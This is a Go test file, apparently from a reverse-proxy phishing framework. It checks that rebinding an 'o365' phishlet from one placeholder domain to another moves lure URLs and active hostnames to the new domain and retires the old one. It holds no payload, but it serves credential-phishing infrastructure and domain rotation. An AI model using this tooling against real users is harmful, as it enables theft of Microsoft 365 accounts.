package core

// Functional test of the dashboard domain workflow, exactly as the dashboard
// handlers drive it:
//  1. AddDashboardDomain("newdomain.com")          — dashboard "Add domain"
//  2. SetPhishletDomain("o365", "newdomain.com")   — rebind phishlet
//  3. GetLureURL for a fresh lure                  — "Create lure"
//  4. Verify lure is on newdomain.com, NOT olddomain.com
//  5. Verify active hostnames / routing tables point at newdomain.com
//  6. DeleteDashboardDomain("olddomain.com")       — deactivate old domain
//  7. Verify old domain is gone from the routing/hostname lists

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestDashboardDomainSwitchFlow(t *testing.T) {
	cfg_dir := t.TempDir()
	cfg, err := NewConfig(cfg_dir, "")
	if err != nil {
		t.Fatalf("NewConfig: %v", err)
	}
	// Server base domain (what `server <domain>` sets) — the OLD domain.
	cfg.SetBaseDomain("olddomain.com")

	// Load the o365 phishlet from the repo's phishlets dir.
	pl, err := NewPhishlet("o365", filepath.Join("..", "phishlets", "2.yaml"), nil, cfg)
	if err != nil {
		t.Fatalf("NewPhishlet: %v", err)
	}
	cfg.AddPhishlet("o365", pl)

	// 1. Old-school binding: phishlet hostname = old domain, enabled.
	if !cfg.SetPhishletDomain("o365", "olddomain.com") {
		// SetPhishletDomain requires the domain to exist in the dashboard list first.
		if !cfg.AddDashboardDomain("olddomain.com") {
			t.Fatal("AddDashboardDomain(olddomain.com) failed")
		}
		if !cfg.SetPhishletDomain("o365", "olddomain.com") {
			t.Fatal("SetPhishletDomain(olddomain.com) failed — hostname binding rejected")
		}
	}
	if err := cfg.SetSiteEnabled("o365"); err != nil {
		t.Fatalf("SetSiteEnabled: %v", err)
	}

	// Sanity: the old binding is active.
	oldActive := cfg.GetActiveHostnames("o365")
	found := false
	for _, h := range oldActive {
		if strings.HasSuffix(h, "olddomain.com") {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected olddomain.com hostnames to be active, got %v", oldActive)
	}

	// 2. Dashboard "Add domain" for the NEW domain.
	if !cfg.AddDashboardDomain("newdomain.com") {
		t.Fatal("AddDashboardDomain(newdomain.com) failed")
	}

	// 3. Dashboard "Create lure with domain=newdomain.com" path:
	//    SetPhishletDomain must rebind hostname to the new domain.
	if !cfg.SetPhishletDomain("o365", "newdomain.com") {
		t.Fatal("SetPhishletDomain(newdomain.com) failed — the standalone-domain rebind is still rejected")
	}

	// 4. Lure URL must now be on the NEW domain.
	l := &Lure{Path: "/" + GenRandomString(8), Phishlet: "o365"}
	cfg.AddLure("o365", l)
	idx := cfg.GetLuresCount() - 1
	u, err := cfg.GetLureURL(idx)
	if err != nil {
		t.Fatalf("GetLureURL: %v", err)
	}
	t.Logf("lure URL: %s", u)
	if !strings.Contains(u, "newdomain.com") {
		t.Fatalf("lure URL not on new domain: %s", u)
	}
	if strings.Contains(u, "olddomain.com") {
		t.Fatalf("lure URL still on old domain: %s", u)
	}

	// 5. Routing: landing phish host + active hostnames must be on the new domain.
	landing := pl.GetLandingPhishHost()
	t.Logf("landing phish host: %s", landing)
	if !strings.HasSuffix(landing, "newdomain.com") {
		t.Fatalf("landing host not on new domain: %s", landing)
	}
	newActive := cfg.GetActiveHostnames("o365")
	newFound, oldFound := false, false
	for _, h := range newActive {
		if strings.HasSuffix(h, "newdomain.com") {
			newFound = true
		}
		if strings.HasSuffix(h, "olddomain.com") {
			oldFound = true
		}
	}
	if !newFound {
		t.Fatalf("no active hostnames on newdomain.com: %v", newActive)
	}
	if oldFound {
		t.Fatalf("old domain hostnames still active after rebind: %v", newActive)
	}

	// 6. Deactivate old domain (dashboard DELETE /api/domains/olddomain.com).
	if !cfg.DeleteDashboardDomain("olddomain.com") {
		t.Fatal("DeleteDashboardDomain(olddomain.com) failed")
	}
	cfg.RefreshActiveHostnames()

	// 7. Old domain must be gone from active hostnames.
	final := cfg.GetActiveHostnames("o365")
	for _, h := range final {
		if strings.HasSuffix(h, "olddomain.com") {
			t.Fatalf("old domain still active after delete: %v", final)
		}
	}

	// And a lure created afterwards is still on the new domain.
	l2 := &Lure{Path: "/" + GenRandomString(8), Phishlet: "o365"}
	cfg.AddLure("o365", l2)
	idx2 := cfg.GetLuresCount() - 1
	u2, err := cfg.GetLureURL(idx2)
	if err != nil {
		t.Fatalf("GetLureURL #2: %v", err)
	}
	t.Logf("lure URL #2: %s", u2)
	if !strings.Contains(u2, "newdomain.com") {
		t.Fatalf("second lure not on new domain: %s", u2)
	}
}
